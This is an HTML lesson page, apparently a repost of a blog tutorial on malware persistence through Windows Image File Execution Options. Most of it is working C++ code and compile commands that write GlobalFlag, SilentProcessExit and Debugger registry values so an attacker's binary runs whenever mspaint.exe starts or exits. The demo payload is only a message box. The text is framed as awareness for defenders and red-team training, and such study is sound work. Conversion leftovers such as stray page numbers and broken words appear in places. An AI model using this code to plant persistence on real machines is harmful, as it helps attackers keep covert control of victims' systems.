@@ -1,0 +1,193 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Malware development: persistence - part 10. Using Image File</title><link rel="stylesheet" href="../../content.css"><script src="../../content.js" defer></script></head><body><main class="lesson">
+    <div class="p-4 sm:p-5 my-6 rounded-2xl bg-[var(--accent-soft)] border border-[var(--accent)] text-[#f0f3ff] flex items-start gap-3 shadow-2xl">
+        <i data-lucide="book-marked" class="w-5 h-5 text-[var(--accent)] flex-shrink-0 mt-0.5"></i>
+        <div class="text-xs sm:text-sm leading-relaxed space-y-1">
+            <div class="font-bold text-[var(--accent)] uppercase tracking-wide">MD-MZ Research Field Note #35</div>
+            <div class="text-[#e2e8f0]">Technical research note on <strong class="text-white">Malware development: persistence - part 10. Using Image File</strong> covering source code implementations, evasion mechanics, and practical attack surface analysis.</div>
+        </div>
+    </div>
+    <p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Execution Options. Simple C++ example.</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">This post is the result of my own research into one of the interesting malware persistence trick: via Image File Execution Options. Image File Execution Options IFEO enables developers to attach a debugger to an application or process. This allows the debugger/application to run concurrently with the application being debugged. How to set this feature? We can launch a process/program when another application silently exits. Silent exit for an application means the application has been terminated in one of two ways: 1. Self termination by calling ExitProcess 2. Another process terminates the monitored process by calling TerminateProcess This is configurable via the following registry key: HKLM\Software\Microsoft\Windows NT\CurrentVersion\SilentProcessExit</p>
+
+            <div id="practical-example" class="scroll-mt-24 pt-6 pb-2 border-b border-[#212b54] mt-8 mb-4">
+                <h3 class="text-base sm:text-lg font-bold text-white flex items-center gap-2">
+                    <i data-lucide="sparkles" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i>
+                    <span>Practical example</span>
+                </h3>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Let’s go to run our malware once Microsoft Paint (mspaint.exe) is silently exiting. So, let’s say we have our “malware” (hack.cpp):</p>
+
+            <div class="my-6 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs">
+                <div class="flex items-center justify-between px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                    <div class="flex items-center gap-2 text-[var(--accent)] font-semibold text-xs tracking-wider uppercase">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5"></i>
+                        <span>C / C++ Source</span>
+                    </div>
+                    <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-3 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition">
+                        <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                        <span>Copy</span>
+                    </button>
+                </div>
+                <pre class="p-4 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono"><code class="language-c">/*
+hack.cpp
+evil app for windows persistence via IFEO
+
+author: @cocomelonc
+https://cocomelonc.github.io/malware/2022/09/10/malware-pers-10.html
+*/
+#include &lt;windows.h&gt;
+#pragma comment (lib, "user32.lib")
+int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
+LPSTR lpCmdLine, int nCmdShow) {
+MessageBox(NULL, "Meow-meow!", "=^..^=", MB_OK);
+return 0;
+}
+As you can see, as usually, I use “meow-meow” message box “malware” =.. =
+Then, create persistence script for modify registry (pers.cpp):
+/*
+pers.cpp
+windows persistence via IFEO (GlobalFlag)
+author: @cocomelonc
+https://cocomelonc.github.io/malware/2022/09/10/malware-pers-10.html
+*/
+#include &lt;windows.h&gt;
+#include &lt;string.h&gt;
+int main(int argc, char* argv[]) {
+HKEY hkey = NULL;
+DWORD gF = 512;
+DWORD rM = 1;
+// image file
+const char* img = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image
+File Execution Options\\mspaint.exe";
+// silent exit
+const char* silent = "SOFTWARE\\Microsoft\\Windows
+NT\\CurrentVersion\\SilentProcessExit\\mspaint.exe";
+// evil app
+const char* exe = "Z:\\2022-09-10-malware-pers-10\\hack.exe";
+
+// GlobalFlag
+// LONG res = RegOpenKeyEx(HKEY_LOCAL_MACHINE, (LPCSTR)"SOFTWARE\\Microsoft\\Windows NT\\C
+LONG res = RegCreateKeyEx(HKEY_LOCAL_MACHINE, (LPCSTR)img, 0, NULL,
+REG_OPTION_NON_VOLATILE, KEY_WRITE | KEY_QUERY_VALUE, NULL, &amp;hkey, NULL);
+if (res == ERROR_SUCCESS) {
+// create new registry key
+
+// reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File
+// Execution Options\mspaint.exe" /v GlobalFlag /t REG_DWORD /d 512
+RegSetValueEx(hkey, (LPCSTR)"GlobalFlag", 0, REG_DWORD, (const BYTE*)&amp;gF, sizeof(gF));
+RegCloseKey(hkey);
+}
+// res = RegOpenKeyEx(HKEY_LOCAL_MACHINE, (LPCSTR)
+//"SOFTWARE\\Microsoft\\Windows
+//NT\\CurrentVersion\\SilentProcessExit\\mspaint.exe", 0 , KEY_WRITE, &amp;hkey);
+res = RegCreateKeyEx(HKEY_LOCAL_MACHINE, (LPCSTR)silent, 0, NULL,
+REG_OPTION_NON_VOLATILE, KEY_WRITE | KEY_QUERY_VALUE, NULL, &amp;hkey, NULL);
+if (res == ERROR_SUCCESS) {
+// create new registry key
+// reg add "HKLM\SOFTWARE\Microsoft\Windows
+// NT\CurrentVersion\SilentProcessExit\notepad.exe" /v ReportingMode /t
+// REG_DWORD /d 1
+// reg add "HKLM\SOFTWARE\Microsoft\Windows
+// NT\CurrentVersion\SilentProcessExit\notepad.exe" /v MonitorProcess /d
+// "Z:\..\hack.exe"
+RegSetValueEx(hkey, (LPCSTR)"ReportingMode", 0, REG_DWORD,
+(const BYTE*)&amp;rM, sizeof(rM));
+RegSetValueEx(hkey, (LPCSTR)"MonitorProcess", 0, REG_SZ,
+(unsigned char*)exe, strlen(exe));
+RegCloseKey(hkey);
+}
+return 0;
+}
+So what have we done here? Firstly, we created SilentProcessExit key under
+HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion, then enabled silent
+process exit monitoring feature by adding GlobalFlag:
+//...
+LONG res = RegCreateKeyEx(HKEY_LOCAL_MACHINE, (LPCSTR)img, 0, NULL,
+REG_OPTION_NON_VOLATILE, KEY_WRITE | KEY_QUERY_VALUE, NULL, &amp;hkey, NULL);
+//...
+//...
+// reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File
+// Execution Options\mspaint.exe" /v GlobalFlag /t REG_DWORD /d 512
+RegSetValueEx(hkey, (LPCSTR)"GlobalFlag", 0, REG_DWORD,
+(const BYTE*)&amp;gF, sizeof(gF));
+//...
+
+By setting MonitorProcess to ...\hack.exe and ReportingMode to 1, every silent
+exit of mspaint.exe will now trigger the execution of our “malware” hack.exe:
+//...
+RegSetValueEx(hkey, (LPCSTR)"ReportingMode", 0, REG_DWORD,
+(const BYTE*)&amp;rM, sizeof(rM));
+RegSetValueEx(hkey, (LPCSTR)"MonitorProcess", 0, REG_SZ, (unsigned char*)exe,
+strlen(exe));
+demo</code></pre>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Let’s go to see everything in action. Compile malware: x86_64-w64-mingw32-g++ -O2 hack.cpp -o hack.exe \ -I/usr/share/mingw-w64/include/ -s \ -ffunction-sections -fdata-sections \ -Wno-write-strings -fno-exceptions -fmerge-all-constants \ -static-libstdc++ -static-libgcc -fpermissive</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Run it, just for check correctness:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">So, check registry keys before:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options" /</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">also SilentProcessExit: reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit" /s</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">As you can see, as expected, some registry keys are missing for our target application. So when it starts and closes nothing happens:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Well, now let’s compile: x86_64-w64-mingw32-g++ -O2 pers.cpp -o pers.exe \ -I/usr/share/mingw-w64/include/ -s \ -ffunction-sections -fdata-sections -Wno-write-strings \ -fno-exceptions -fmerge-all-constants \ -static-libstdc++ -static-libgcc -fpermissive</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">and run our script for persistence pers.exe, then check registry keys again:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">.\pers.exe reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options" /</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit" /s</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Finally, run mspaint.exe again:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">and close it:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">The ReportingMode registry key enables the Windows Error Reporting process (WerFault.exe) which will be the parent process of the MonitorProcess key value hack.exe:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">WerFault.exe - used for tracking errors related to operating system, Win672</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">dows features and applications. IFEO debugger type There are another implementation of IFEO via debugger key. Just create a debugger to a victim process in this registry key: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\mspaint.exe then only requires the malicious application to be stored in System32. So source code is simple and looks like this:</p>
+
+            <div class="my-6 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs">
+                <div class="flex items-center justify-between px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                    <div class="flex items-center gap-2 text-[var(--accent)] font-semibold text-xs tracking-wider uppercase">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5"></i>
+                        <span>C / C++ Source</span>
+                    </div>
+                    <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-3 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition">
+                        <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                        <span>Copy</span>
+                    </button>
+                </div>
+                <pre class="p-4 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono"><code class="language-c">/*
+pers2.cpp
+windows persistence via IFEO 2(Debugger)
+author: @cocomelonc
+https://cocomelonc.github.io/malware/2022/09/10/malware-pers-10.html
+*/
+#include &lt;windows.h&gt;
+#include &lt;string.h&gt;
+int main(int argc, char* argv[]) {
+HKEY hkey = NULL;
+DWORD gF = 512;
+DWORD rM = 1;
+// image file
+const char* img = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image
+File Execution Options\\mspaint.exe";
+// evil app
+const char* exe = "hack.exe";
+// Debugger
+LONG res = RegCreateKeyEx(HKEY_LOCAL_MACHINE, (LPCSTR)img, 0, NULL,
+REG_OPTION_NON_VOLATILE, KEY_WRITE | KEY_QUERY_VALUE, NULL, &amp;hkey, NULL);
+if (res == ERROR_SUCCESS) {
+// create new registry key
+// reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File
+// Execution Options\mspaint.exe" /v Debugger /d "hack.exe"
+RegSetValueEx(hkey, (LPCSTR)"Debugger", 0, REG_SZ, (unsigned char*)exe,
+strlen(exe));
+RegCloseKey(hkey);
+}
+return 0;
+
+}
+Let’s compile it:
+x86_64-w64-mingw32-g++ -O2 pers2.cpp -o pers2.exe \
+-I/usr/share/mingw-w64/include/ -s \
+-ffunction-sections -fdata-sections -Wno-write-strings \
+-fno-exceptions -fmerge-all-constants -static-libstdc++ \
+-static-libgcc -fpermissive</code></pre>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">An example of how this appears in action:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">675</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">When the Microsoft Paint process (mspaint.exe) is launched this will cause the malware to be executed. Perfect! This persistence trick is used by APT29 group and software like SUNBURST in the</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">wild. I hope this post spreads awareness to the blue teamers of this interesting technique, and adds a weapon to the red teamers arsenal. ATT&CK MITRE: IFEO Injection MSDN: Monitoring Silent Process Exit Persistence using GlobalFlags in Image File Execution Options - Hidden from autoruns.exe APT29 SUNBURST source code on github</p></main></body></html>
